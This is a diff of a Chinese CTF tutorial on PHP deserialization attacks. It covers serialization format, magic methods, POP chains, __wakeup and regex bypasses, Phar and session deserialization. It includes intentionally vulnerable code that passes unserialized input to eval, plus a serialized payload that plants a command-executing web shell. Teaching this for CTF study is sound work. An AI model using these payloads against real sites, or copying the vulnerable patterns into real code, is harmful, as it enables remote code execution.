@@ -1,10 +1,10 @@
 # PHP反序列化
 
-序列化是一种将**数据结构**或**对象状态**转换为**可存储或传输的格式**的过程。序列化可以使数据在不同的平台或环境中进行交换或保存，以便在需要时恢复原始的数据结构或对象状态。
+序列化是将**数据结构**或**对象状态**转换为**可存储或传输的格式**的过程，以便在不同平台或环境中交换或保存，并在需要时恢复原始状态。
 
-反序列化是一种将序列化后的数据（如字符串，字节流等）**还原**为原始对象的过程。
+反序列化是将序列化后的数据（如字符串，字节流等）**还原**为原始对象的过程。
 
-PHP提供了两个内置函数来实现序列化和反序列化：
+PHP提供了两个内置函数实现序列化和反序列化：
 
 - [serialize()](https://www.php.net/manual/zh/function.serialize.php)，序列化函数，生成值的可存储表示。可处理所有的类型，除了 resource 类型和一些 object（大多数是没有序列化接口的内置对象）
 
@@ -22,19 +22,21 @@ echo "字符串 " . serialize("This is a string"). PHP_EOL; // 字符串 s:16:"T
 echo "布尔型 " . serialize(FALSE). PHP_EOL; // 布尔型 b:0;
 echo "NULL " . serialize(NULL). PHP_EOL; // NULL N;
 echo "数组 " . serialize(['foo', 'bar', 'baz']). PHP_EOL; // 数组 a:3:{i:0;s:3:"foo";i:1;s:3:"bar";i:2;s:3:"baz";}
-
-# 反序列化
-$a = unserialize('s:16:"This is a string";');
-var_dump($a); // string(16) "This is a string"
-?>
 ```
 
-例题：
+- 反序列化示例
+
+```php
+$a = unserialize('s:16:"This is a string";');
+var_dump($a); // string(16) "This is a string"
+```
+
+- 例题
 
 ```php
 <?php
 if(unserialize($_GET['name']) === 'admin') {
-  echo "flag{}";
+  echo "flag{...}";
 }
 ```
 
@@ -43,38 +45,43 @@ if(unserialize($_GET['name']) === 'admin') {
 [对象序列化](https://www.php.net/manual/zh/language.oop5.serialization.php)
 
 ```php
-O:6:"Person":3:{s:8:"username";s:4:"john";s:6:"%00*%00age";i:20;s:12:"%00Person%00isOK";b:0;}
-O:类名长度:类名:属性个数:{s:属性名长度:属性名;s:属性值长度:属性值;...}
-```
-
-```php
 <?php
 class Person
 {
-   public $username = 'john';
-   protected $age =  20;
-   private $isOK = false;
+    public $username = 'john';
+    protected $age = 20;
+    private $isOK = false;
 
-   public function get_username()
-   {
-      return $this->usernme;
-   }
+    public function get_username() {
+        return $this->usernme;
+    }
 }
 
 $p = new Person();
-var_dump(serialize($p));
+$serialized = serialize($p);
+// 由于ASCII为0的字符不可见，替换为%00
+echo str_replace("\x00", "%00", $serialized);
 ```
 
-- 序列化字符串只包含属性，不包含方法
-- 属性的访问控制不一样，序列化后表现形式也不一样，属性有`public`、`protected`、`private`
-  - `protected` - %00*%00
-  - `private` - %00类名%00
+结果示例：
+
+```php
+O:6:"Person":3:{s:8:"username";s:4:"john";s:6:"%00*%00age";i:20;s:12:"%00Person%00isOK";b:0;}
+// O:类名长度:类名:属性个数:{s:属性名长度:属性名;s:属性值长度:属性值;...}
+```
+
+序列化字符串的特点：
+
+- 序列化字符串仅包含属性，不包含方法。
+- 属性的访问控制不同，序列化后表现形式也不同：
+  - `protected` 属性表示为 `%00*%00`
+  - `private` 属性表示为 `%00类名%00`
 
 ## 常见魔术方法
 
-魔术方法是一种特殊的方法，当对象执行某些操作时会覆盖PHP的默认操作，[了解更多](https://www.php.net/manual/zh/language.oop5.magic.php)
+魔术方法是一种特殊的方法，会在对象执行某些操作时覆盖PHP的默认操作，[了解更多](https://www.php.net/manual/zh/language.oop5.magic.php)
 
-<div grid="~ cols-2 gap-4"><div>
+### 魔术方法名称及说明
 
 ```php
 <?php
@@ -131,7 +138,7 @@ $o = new Person('Alice', 18);
 // 对象被当成字符串时调用
 echo $o;
 
-// 以调用函数的方式调用一个对象时
+// 以调用函数的方式调用对象
 $o();
 
 // 访问不存在的属性
@@ -139,15 +146,14 @@ $o->not_found_property;
 // 给不存在的属性赋值
 $o->not_found_property = 'test';
 
-// 调用一个不可访问方法时
+// 调用一个不可访问方法
 $o->not_found_method();
 
-// 序列化
-$str = serialize($o);
-// 反序列化
-unserialize($str);
+// 序列化和反序列化
+$serialized = serialize($o);
+unserialize($serialized);
 
-/* output
+/* 输出
 __construct
 __toString
 __invoke
@@ -172,27 +178,22 @@ __destruct
 |__get()|读取不可访问（protected 或 private）或不存在的属性的值时|
 |__call()|当对象调用一个不可访问方法时|
 
-
-### 经典例题分析
-
-- 源代码
+### 例题分析
 
 ```php
 <?php
 class test {
- public $cmd;
+    public $cmd;
 
- function __destruct() {
-  eval($this->cmd);
- }
+    function __destruct() {
+        eval($this->cmd);
+    }
 }
 
 unserialize($_GET['u']);
 ```
 
-存在`test`类，其中析构函数`__destruct()`有代码执行
-
-需要在本地调试代码，生成所需要的序列化字符串
+`test`类的析构函数`__destruct()`存在代码执行漏洞。需要在本地调试代码，生成所需要的序列化字符串。
 
 - EXP：
 
@@ -216,6 +217,11 @@ echo serialize($o);
 // O:4:"test":1:{s:3:"cmd";s:19:"?><?=`$_GET["cmd"]`";}
 ```
 
+练习题
+
+- BUUCTF - [NewStarCTF 2023 公开赛道]Unserialize?
+
+
 ## 常见绕过方法
 
 - `__wakeup()`方法绕过（[CVE-2016-7124](https://www.cve.org/CVERecord?id=CVE-2016-7124)）
@@ -231,6 +237,9 @@ PHP before 5.6.25 and 7.x before 7.0.10
 - 表示字符类型的标识`S`为**大写**时，其内容会被当成十六进制解析，如`s:3:"\61\62\63"`
 - 使用`+`绕过`preg_match('/^O:\d+/')`正则检查，如`O:+4:"test"`
 
+练习题
+
+- BUUCTF - [NewStarCTF 2023 公开赛道]Unserialize Again
 
 ## POP链构造
 
@@ -240,19 +249,7 @@ PHP before 5.6.25 and 7.x before 7.0.10
 
 题目中有多个类，且每个类存在魔术方法
 
-
-## PHP原生类
-
-PHP内置类
-
-读取目录、文件
-
-- [DirectoryIterator](https://www.php.net/manual/zh/class.directoryiterator.php) - 列出当前目录下的文件信息
-- [Filesystemlterator](https://www.php.net/manual/zh/class.filesystemiterator.php) - 以绝路路径的形式列出的文件信息
-- [Globlterator](https://www.php.net/manual/zh/class.globiterator.php) - 遍历一个文件目录，可以通过模式匹配来寻找文件路径
-
-- [SplFileInfo](https://www.php.net/manual/en/class.splfileinfo.php) - SplFileInfo类为单个文件的信息提供了高级的面向对象接口
-
+题目？？
 
 ## Phar反序列化
 
@@ -416,7 +413,7 @@ if ($_POST['action'] === "upload") {
 }
 ```
 
-## PHP session 反序列化
+## session 反序列化
 
 `session`是一种“会话机制”，其数据存储于服务端，PHP提供`$_SEESION`超全局变量
 
@@ -438,9 +435,7 @@ $_SESSION['username'] = 'Alice';
 |session.save_path|保存路径，默认路径有`/tmp/`、`/var/lib/php/`|
 |session.serialize_handler|序列化处理器名称，有`php`、`php_binary`和`php_serialize`三种，默认为`php`|
 
-
 不同序列化处理器，序列化数据存储格式不同
-
 
 ```php
 <?php
@@ -478,14 +473,6 @@ $_SESSION['age'] = 25;
 
 
 例题：Jarvis OJ — PHPINFO  分析
-
-<style>
-  .slidev-code {
-    height: 400px !important;
-  }
-</style>
-
-<div grid="~ cols-2 gap-4"><div>
 
 ```php
 <?php
@@ -566,7 +553,20 @@ echo serialize($obj);
 
 ## 字符逃逸
 
+<!--
+https://medium.com/@lyltvip/php-deserialization-escape-970cd8ea714e
+-->
+## PHP原生类
 
+PHP内置类
+
+读取目录、文件
+
+- [DirectoryIterator](https://www.php.net/manual/zh/class.directoryiterator.php) - 列出当前目录下的文件信息
+- [Filesystemlterator](https://www.php.net/manual/zh/class.filesystemiterator.php) - 以绝路路径的形式列出的文件信息
+- [Globlterator](https://www.php.net/manual/zh/class.globiterator.php) - 遍历一个文件目录，可以通过模式匹配来寻找文件路径
+
+- [SplFileInfo](https://www.php.net/manual/en/class.splfileinfo.php) - SplFileInfo类为单个文件的信息提供了高级的面向对象接口
 
 ## 练习题
 
@@ -603,5 +603,5 @@ echo urlencode(serialize($o));
 O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
 ```
 
-### 2020-网鼎杯朱雀组-phpweb
+### buuctf - 2020-网鼎杯朱雀组-phpweb
 ### ISCC_2022_POP2022
